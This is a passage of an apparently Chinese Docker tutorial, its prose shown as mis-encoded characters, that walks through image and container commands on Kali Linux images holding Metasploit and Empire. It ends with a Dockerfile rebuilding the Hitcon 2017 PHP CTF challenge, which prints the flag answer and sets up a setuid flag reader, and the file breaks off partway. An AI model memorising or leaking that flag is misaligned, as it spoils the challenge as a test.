href="#9-å­˜å‡ºå’Œè½½å…¥é•œåƒ" class="headerlink" title="9.å­˜å‡ºå’Œè½½å…¥é•œåƒ"></a>9.å­˜å‡ºå’Œè½½å…¥é•œåƒ</h4><p>1ï¼‰å­˜å‡ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o docker_for_msf.tar kalilinux:0.1</span><br></pre></td></tr></table></figure><p>2ï¼‰è½½å…¥é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker load --input docker_for_msf.tar</span><br><span class="line"><span class="comment">#æˆ–åˆ™</span></span><br><span class="line">docker load &lt; docker_for_msf.tar</span><br></pre></td></tr></table></figure><h4 id="10-ä¸Šä¼ é•œåƒ"><a href="#10-ä¸Šä¼ é•œåƒ" class="headerlink" title="10.ä¸Šä¼ é•œåƒ"></a>10.ä¸Šä¼ é•œåƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push kalilinux:0.1</span><br></pre></td></tr></table></figure><h3 id="æ“ä½œå®¹å™¨"><a href="#æ“ä½œå®¹å™¨" class="headerlink" title="æ“ä½œå®¹å™¨"></a>æ“ä½œå®¹å™¨</h3><h4 id="1-åˆ›å»ºå®¹å™¨"><a href="#1-åˆ›å»ºå®¹å™¨" class="headerlink" title="1.åˆ›å»ºå®¹å™¨"></a>1.åˆ›å»ºå®¹å™¨</h4><p>1ï¼‰æ–°å»ºå®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker createæ–°å»ºçš„å®¹å™¨å¤„äºé™æ­¢ï¼Œå¯ä»¥ä½¿ç”¨docker startæ¥å¯åŠ¨å®ƒ</span></span><br><span class="line"><span class="comment">#-i ä¿æŒæ ‡å‡†è¾“å…¥æ‰“å¼€   -tåˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯</span></span><br><span class="line">âœ  ~ docker create -it kalilinux:0.1</span><br><span class="line">2bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf</span><br><span class="line"><span class="comment">#æŸ¥çœ‹å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨</span></span><br><span class="line">âœ  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES</span><br><span class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 seconds ago       Created                                      frosty_poitras</span><br><span class="line">de573c5f5dc6        kalilinux:latest    <span class="string">"/bin/bash"</span>         5 hours ago         Exited (0) 5 hours ago                       happy_goldberg</span><br></pre></td></tr></table></figure><p>2ï¼‰å¯åŠ¨å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker start id å¯åŠ¨ç›¸åº”çš„å®¹å™¨</span></span><br><span class="line"><span class="comment">#docker ps æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨</span></span><br><span class="line">âœ  ~ docker start 2bc48b88a424</span><br><span class="line">2bc48b88a424</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         9 minutes ago       Up 8 seconds                            frosty_poitras</span><br></pre></td></tr></table></figure><p>3ï¼‰æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker run = docker create + docker start</span></span><br><span class="line"><span class="comment">#runçš„è¿‡ç¨‹ï¼š1.æ£€æŸ¥é•œåƒæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±ä¸‹è½½ï¼›2.ç”¨é•œåƒåˆ›å»ºå®¹å™¨ï¼›æŒ‚è½½å¯è¯»å†™å±‚ï¼›3.åˆ†é…è™šæ‹Ÿæ¥å£</span></span><br><span class="line"><span class="comment">#4.åˆ†é…IPï¼›5.è¿è¡ŒæŒ‡å®šç¨‹åºï¼›6.æ‰§è¡Œå®Œè‡ªåŠ¨ç»ˆæ­¢</span></span><br><span class="line">âœ  ~ docker run kalilinux:0.1 /bin/<span class="built_in">echo</span> <span class="string">'zeroyu'</span></span><br><span class="line">zeroyu</span><br><span class="line">âœ  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES</span><br><span class="line">d6a6045c4f8b        kalilinux:0.1       <span class="string">"/bin/echo zeroyu"</span>   3 minutes ago       Exited (0) 3 minutes ago                       cocky_kirch</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="comment">#å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹</span></span><br><span class="line">âœ  ~ docker run -it kalilinux:0.1 /bin/bash</span><br><span class="line">root@2ed8aa5354f1:/<span class="comment"># ps</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">    1 pts/0    00:00:00 bash</span><br><span class="line">    7 pts/0    00:00:00 ps</span><br><span class="line">root@2ed8aa5354f1:/<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment">#é€€å‡ºåè‡ªåŠ¨å¤„äºç»ˆæ­¢çŠ¶æ€</span></span><br><span class="line">âœ  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND              CREATED              STATUS                      PORTS               NAMES</span><br><span class="line">2ed8aa5354f1        kalilinux:0.1       <span class="string">"/bin/bash"</span>          About a minute ago   Exited (0) 48 seconds ago                       goofy_bardeen</span><br></pre></td></tr></table></figure><p>4ï¼‰å®ˆæŠ¤æ€è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åœ¨åå°è¿è¡Œå®¹å™¨</span></span><br><span class="line">âœ  ~ docker run -d kalilinux:0.1 /bin/sh -c <span class="string">"while true ; do echo zeroyu ; sleep 1 ; done"</span></span><br><span class="line">88f12c0725a466ba6d8f08f34fc8e9ac263ecafdff0a9e7282d7e9bb4073e6a0</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">88f12c0725a4        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   7 seconds ago       Up 7 seconds                            sleepy_kowalevski</span><br><span class="line">âœ  ~ docker logs 88f12c0725a4</span><br><span class="line">zeroyu</span><br><span class="line">zeroyu</span><br><span class="line">zeroyu</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="2-ç»ˆæ­¢å®¹å™¨"><a href="#2-ç»ˆæ­¢å®¹å™¨" class="headerlink" title="2.ç»ˆæ­¢å®¹å™¨"></a>2.ç»ˆæ­¢å®¹å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#idä¸º88f12c0725a4ä½†æ˜¯å¯ä»¥ä½¿ç”¨å‰å‡ ä½æ¥ç®€å•è¡¨ç¤º</span></span><br><span class="line">âœ  ~ docker stop 88</span><br><span class="line">88</span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ‰€æœ‰å¤„äºç»ˆæ­¢æ€çš„id</span></span><br><span class="line">âœ  ~ docker ps -qa</span><br><span class="line">073ff4e1dac7</span><br><span class="line"><span class="comment">#å¤„äºç»ˆæ­¢çŠ¶æ€å¯ä»¥ä½¿ç”¨startæ¥é‡æ–°å¯åŠ¨</span></span><br><span class="line">âœ  ~ docker start 073</span><br><span class="line">073</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</span><br><span class="line">073ff4e1dac7        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   About a minute ago   Up About a minute                       cranky_benz</span><br><span class="line"><span class="comment">#restartå¯ä»¥å…ˆç»ˆæ­¢å†é‡æ–°å¯åŠ¨</span></span><br><span class="line">âœ  ~ docker restart 073</span><br><span class="line">073</span><br></pre></td></tr></table></figure><h4 id="3-è¿›å…¥å®¹å™¨"><a href="#3-è¿›å…¥å®¹å™¨" class="headerlink" title="3.è¿›å…¥å®¹å™¨"></a>3.è¿›å…¥å®¹å™¨</h4><p>å¤„äºå®ˆæŠ¤æ€ï¼ˆ-då‚æ•°ï¼‰çš„å®¹å™¨ä¼šåœ¨åå°è¿è¡Œï¼Œä½†æ˜¯ä½ æ— æ³•åˆ°ä¿¡æ¯ï¼Œä¹Ÿæ— æ³•è¿›è¡Œæ“ä½œã€‚æ­¤æ—¶ï¼Œè¦è¿›å…¥å®¹å™¨è¿›è¡Œå·¥ä½œï¼Œè¦ä½¿ç”¨attachæˆ–è€…execå‘½ä»¤ã€‚</p><p>1ï¼‰    ä½¿ç”¨attachå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å®¹å™¨è¿˜å¯ä»¥ä½¿ç”¨nameæ¥å”¯ä¸€è¾¨è¯†</span></span><br><span class="line">âœ  ~ docker run -itd kalilinux:0.1</span><br><span class="line">77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         20 seconds ago      Up 21 seconds                           stupefied_gates</span><br><span class="line">âœ  ~ docker attach stupefied_gates</span><br><span class="line">root@77e93d18a6a5:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2ï¼‰ä½¿ç”¨execå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                          PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         5 minutes ago       Exited (0) About a minute ago                       stupefied_gates</span><br><span class="line">âœ  ~ docker start 77e</span><br><span class="line">77e</span><br><span class="line">âœ  ~ docker <span class="built_in">exec</span> -it 77e93d18a6a5 /bin/bash</span><br><span class="line">root@77e93d18a6a5:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="4-åˆ é™¤å®¹å™¨"><a href="#4-åˆ é™¤å®¹å™¨" class="headerlink" title="4.åˆ é™¤å®¹å™¨"></a>4.åˆ é™¤å®¹å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 minutes ago       Up About a minute                       stupefied_gates</span><br><span class="line">âœ  ~ docker rm 77e93d18a6a5</span><br><span class="line">Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove</span><br><span class="line">âœ  ~ docker stop 77e93d18a6a5</span><br><span class="line">77e93d18a6a5</span><br><span class="line">âœ  ~ docker rm 77e93d18a6a5</span><br><span class="line">77e93d18a6a5</span><br></pre></td></tr></table></figure><h4 id="5-å¯¼å…¥å’Œå¯¼å‡ºå®¹å™¨"><a href="#5-å¯¼å…¥å’Œå¯¼å‡ºå®¹å™¨" class="headerlink" title="5.å¯¼å…¥å’Œå¯¼å‡ºå®¹å™¨"></a>5.å¯¼å…¥å’Œå¯¼å‡ºå®¹å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¼å‡ºå®¹å™¨</span></span><br><span class="line"><span class="comment">#æ— è®ºè¿™ä¸ªå®¹å™¨æ˜¯å¦æ­£åœ¨è¿è¡Œéƒ½æ˜¯å¯ä»¥å¯¼å‡ºçš„</span></span><br><span class="line">âœ  ~ docker <span class="built_in">export</span> -o test.tar 77e93d18a6a5</span><br><span class="line"><span class="comment">#æˆ–è€…æ‰§è¡Œ</span></span><br><span class="line">âœ  ~ docker <span class="built_in">export</span> 77e93d18a6a5 &gt; test.tar </span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯¼å…¥å®¹å™¨</span></span><br><span class="line">âœ  ~ docker import test.tar - <span class="built_in">test</span>/kalilinux:v1.0</span><br></pre></td></tr></table></figure><h3 id="Dockeræ•°æ®ç®¡ç†"><a href="#Dockeræ•°æ®ç®¡ç†" class="headerlink" title="Dockeræ•°æ®ç®¡ç†"></a>Dockeræ•°æ®ç®¡ç†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä½¿ç”¨-væ ‡è®°æŒ‚åœ¨æœ¬åœ°çš„tmpç›®å½•åˆ°å®¹å™¨ä¸­çš„/opt/tmp_test</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨rwï¼ˆé»˜è®¤ä¹Ÿæ˜¯è¿™ç§æ–¹å¼ï¼‰æ¥æŒ‡å®šå¯è¯»å†™</span></span><br><span class="line"><span class="comment">#ä¸‹é¢çš„#è¡¨ç¤ºçš„ä¸æ˜¯æ³¨é‡Š</span></span><br><span class="line">âœ  ~ docker run -it -P  --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin  boot  devetc  home  liblib64  media  mnt  optproc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"><span class="comment"># cd opt</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">tmp_test</span><br><span class="line"><span class="comment"># cd tmp_test</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">com.apple.launchd.0fGM76e6ao  com.apple.launchd.UWfVYRXkwo  powerlog</span><br><span class="line">com.apple.launchd.AkQGotnulN  pip-FfQw68-unpack    zeroyu.txt</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Dockerç«¯å£æ˜ å°„"><a href="#Dockerç«¯å£æ˜ å°„" class="headerlink" title="Dockerç«¯å£æ˜ å°„"></a>Dockerç«¯å£æ˜ å°„</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-Pæ˜¯æŒ‡æ˜ å°„åˆ°ä»»æ„ç«¯å£</span></span><br><span class="line"><span class="comment">#-påŠ ç«¯å£å·(æœ¬åœ°ç«¯å£:è¿œç¨‹ç«¯å£=&gt;0.0.0.0:8080:80)ï¼Œåˆ™å°†ç«¯å£æ˜ å°„åˆ°æ‰€æœ‰åœ°å€çš„ç›¸åº”ç«¯å£</span></span><br><span class="line">âœ  ~ docker run -it -d -p 5000:5000 kalilinux:v0.2</span><br><span class="line">23e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91</span><br><span class="line">âœ  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">23e91a40cb12        kalilinux:v0.2      <span class="string">"/bin/bash"</span>         12 seconds ago      Up 11 seconds       0.0.0.0:5000-&gt;5000/tcp   boring_volhard</span><br><span class="line">âœ  ~ docker attach boring_volhard</span><br><span class="line">root@23e91a40cb12:/<span class="comment"># cd home/Empire/</span></span><br><span class="line">root@23e91a40cb12:/home/Empire<span class="comment"># ls</span></span><br><span class="line">LICENSE  README.md  changelog  data  empire  lib  setup</span><br><span class="line">root@23e91a40cb12:/home/Empire<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><h4 id="DockerfileåŸºæœ¬è¯­å¥çš„è¯´æ˜"><a href="#DockerfileåŸºæœ¬è¯­å¥çš„è¯´æ˜" class="headerlink" title="DockerfileåŸºæœ¬è¯­å¥çš„è¯´æ˜"></a>DockerfileåŸºæœ¬è¯­å¥çš„è¯´æ˜</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> &lt;image:ç‰ˆæœ¬æ ‡ç­¾&gt;ï¼šè¯¥ image æ–‡ä»¶ç»§æ‰¿æŸä¸ªé•œåƒ imageï¼Œå†’å·è¡¨ç¤ºæ ‡ç­¾ï¼Œè¿™é‡Œæ ‡ç­¾æ˜¯<span class="number">8.4</span>ï¼Œå³<span class="number">8.4</span>ç‰ˆæœ¬çš„ nodeã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> &lt;name&gt; &lt;email&gt; :æè¿°é•œåƒçš„åˆ›å»ºè€…ï¼Œåç§°å’Œé‚®ç®±</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> .[directory]ï¼šå°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆé™¤äº†.dockerignoreæ’é™¤çš„è·¯å¾„ï¼‰ï¼Œéƒ½æ‹·è´è¿›å…¥ image æ–‡ä»¶çš„ directory ç›®å½•ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash">  æºè·¯å¾„ ç›®æ ‡è·¯å¾„ :å°†ä¸»æœºæ„å»ºç¯å¢ƒï¼ˆä¸Šä¸‹æ–‡ï¼‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€ä»¥åŠä¸€ä¸ªURLæ ‡è®°çš„æ–‡ä»¶ æ‹·è´åˆ°é•œåƒä¸­ã€‚ä¸COPYç›¸æ¯”ADDå¯ä»¥è‡ªåŠ¨è§£å‹ï¼Œä¹Ÿå¯ä»¥å¤åˆ¶ç½‘ç»œæ–‡ä»¶ã€‚è·¯å¾„ä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> [directory]ï¼šæŒ‡å®šæ¥ä¸‹æ¥çš„å·¥ä½œè·¯å¾„ä¸º directoryã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> [cmd]ï¼šåœ¨/appç›®å½•ä¸‹ï¼Œè¿è¡Œ[cmd]å‘½ä»¤å®‰è£…ä¾èµ–ã€‚æ³¨æ„ï¼Œå®‰è£…åæ‰€æœ‰çš„ä¾èµ–ï¼Œéƒ½å°†æ‰“åŒ…è¿›å…¥ image æ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> [port]ï¼šå°†å®¹å™¨ port ç«¯å£æš´éœ²å‡ºæ¥ï¼Œ å…è®¸å¤–éƒ¨è¿æ¥è¿™ä¸ªç«¯å£ã€‚åœ¨docker <span class="keyword">run</span><span class="bash"> -pçš„æ—¶å€™ç”Ÿæ•ˆã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"path"</span>] : åœ¨ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªæŒ‚è½½ï¼ŒæŒ‚è½½åˆ°å®¹å™¨çš„æŒ‡å®šè·¯å¾„ã€‚docker run -vå‘½ä»¤ä¹Ÿèƒ½å®Œæˆè¿™ä¸ªæ“ä½œï¼Œè€Œä¸”æ›´å¼ºå¤§ã€‚è¿™ä¸ªå‘½ä»¤ä¸èƒ½æŒ‡å®šä¸»æœºçš„éœ€è¦æŒ‚è½½åˆ°å®¹å™¨çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚ä½†docker run -vå¯ä»¥ï¼Œè€Œä¸”å…¶è¿˜å¯ä»¥æŒ‚è½½æ•°æ®å®¹å™¨ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [cmd]ï¼šåœ¨å®¹å™¨å¯åŠ¨åè‡ªåŠ¨æ‰§è¡Œ [cmd] å‘½ä»¤(åªä¼šå‡ºç°ä¸€æ¬¡)</span></span><br><span class="line"></span><br><span class="line">EVN &lt;key&gt; &lt;value&gt; : åªèƒ½è®¾ç½®ä¸€ä¸ªï¼Œè®¾ç½®å®¹å™¨çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®©å…¶åé¢çš„<span class="keyword">RUN</span><span class="bash">å‘½ä»¤ä½¿ç”¨ï¼Œå®¹å™¨è¿è¡Œçš„æ—¶å€™è¿™ä¸ªå˜é‡ä¹Ÿä¼šä¿ç•™ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="CTFä¸­çš„Dockerfileå®ä¾‹å±•ç¤º"><a href="#CTFä¸­çš„Dockerfileå®ä¾‹å±•ç¤º" class="headerlink" title="CTFä¸­çš„Dockerfileå®ä¾‹å±•ç¤º"></a>CTFä¸­çš„Dockerfileå®ä¾‹å±•ç¤º</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Hitcon 2017 web baby^h-master-php-2017</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#read_secretè¾“å‡ºOrangeOrangeOrange</span></span><br><span class="line"><span class="comment">#MaxConnectionsPerChildä¸º100</span></span><br><span class="line"><span class="comment">#å…¶ä½™ç¯å¢ƒä¸é¢˜ç›®å¤§è‡´æ— å¼‚</span></span><br><span class="line"><span class="comment">#å¦‚è¦ä¿®æ”¹rootä¸é¢˜ç›®ç”¨æˆ·å¯†ç è¯·ç”¨ [docker exec -it 'ä½ çš„åº”ç”¨åç§°' /bin/bash] è¿›å…¥å®¹å™¨ä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•´åˆ apache php7</span></span><br><span class="line"><span class="keyword">FROM</span> pr0ph3t/lap7</span><br><span class="line"><span class="keyword">MAINTAINER</span> Pr0ph3t &lt;<span class="number">1415314884</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Install crontab and perl with LWP</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update -y &amp;&amp; apt-get install cron -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Init crontab , æ¯å¤©å‡Œæ™¨4ç‚¹æ¸…ç©ºdataæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'0 4 * * * root rm -rf /var/www/data/*'</span> &gt;&gt; /etc/crontab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Init challenge</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> readflag /read_flag</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> read_secret /read_secret</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> avatar-1.gif /var/www/html/avatar.gif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod u+s /read_flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown www-data /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod -R 775 /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'hitcon&#123;Th3 d4rk fl4m3 PHP Mast3r&#125;'</span> &gt; /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Configure the apache2</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/Indexes //'</span> /etc/apache2/apache2.conf &gt; /etc/apache2/apache2.conf.new</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/MaxConnectionsPerChild   0/MaxConnectionsPerChild   100/'</span> /etc/apache2/mods-available/mpm_prefork.conf &gt; /etc/apache2/mods-available/mpm_prefork.conf.new</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/apache2.conf.new /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/mods-available/mpm_prefork.conf.new /etc/apache2/mods-available/mpm_prefork.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;Directory "/var/www/data"&gt;\n\tphp_flag engine off\n&lt;/Directory&gt;'</span> &gt;&gt; /etc/apache2/sites-enabled/000-default.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Create run.sh</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> run.sh /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /run.sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Expose http 